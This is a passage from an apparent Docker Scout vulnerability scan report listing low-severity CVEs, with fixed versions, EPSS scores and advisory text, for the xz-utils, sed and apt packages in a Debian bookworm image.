<small><code>pkg:deb/debian/xz-utils@5.4.1-0.2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-31115?s=debian&n=xz-utils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C5.4.1-1"><img alt="low : CVE--2025--31115" src="https://img.shields.io/badge/CVE--2025--31115-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><5.4.1-1</code></td></tr>
<tr><td>Fixed version</td><td><code>5.4.1-1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.041%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

XZ Utils provide a general-purpose data-compression library plus command-line tools. In XZ Utils 5.3.3alpha to 5.8.0, the multithreaded .xz decoder in liblzma has a bug where invalid input can at least result in a crash. The effects include heap use after free and writing to an address based on the null pointer plus an offset. Applications and libraries that use the lzma_stream_decoder_mt function are affected. The bug has been fixed in XZ Utils 5.8.1, and the fix has been committed to the v5.4, v5.6, v5.8, and master branches in the xz Git repository. No new release packages will be made from the old stable branches, but a standalone patch is available that applies to all affected releases.

---
- xz-utils 5.8.1-1
[bullseye] - xz-utils <not-affected> (Vulnerable code introduced later)
https://www.openwall.com/lists/oss-security/2025/04/03/1
https://tukaani.org/xz/threaded-decoder-early-free.html
https://github.com/tukaani-project/xz/security/advisories/GHSA-6cc8-p5mm-29w2

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>sed</strong> <code>4.9-1</code> (deb)</summary>

<small><code>pkg:deb/debian/sed@4.9-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-5958?s=debian&n=sed&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.9-1%2Bdeb12u1"><img alt="low : CVE--2026--5958" src="https://img.shields.io/badge/CVE--2026--5958-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.9-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>4.9-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When sed is invoked with both -i (in-place edit) and --follow-symlinks, the function open_next_file() performs two separate, non-atomic filesystem operations on the same path:  1. resolves symlink to its target and stores the resolved path for determining when output is written, 2. opens the original symlink path (not the resolved one) to read the file.  Between these two calls there is a race window. If an attacker atomically replaces the symlink with a different target during that window, sed will: read content from the new (attacker-chosen) symlink target and write the processed result to the path recorded in step 1. This can lead to arbitrary file overwrite with attacker-controlled content in the context of the sed process.   This issue was fixed in version 4.10.

---
- sed 4.9-3 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1134495)
[trixie] - sed 4.9-2+deb13u1
[bookworm] - sed 4.9-1+deb12u1
[bullseye] - sed <postponed> (Minor issue; can be fixed in next update)
https://gitweb.git.savannah.gnu.org/gitweb/?p=sed.git;a=commit;h=6b9b43c55ccd3beadbc0094b983c82bdb389f33b
https://www.openwall.com/lists/oss-security/2026/05/13/1

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>apt</strong> <code>2.6.1</code> (deb)</summary>

<small><code>pkg:deb/debian/apt@2.6.1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2011-3374?s=debian&n=apt&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2011--3374" src="https://img.shields.io/badge/CVE--2011--3374-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.230%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>80th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.

---
- apt <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=642480)
Not exploitable in Debian, since no keyring URI is defined

</blockquote>
</details>
</details></td></tr>
</table>

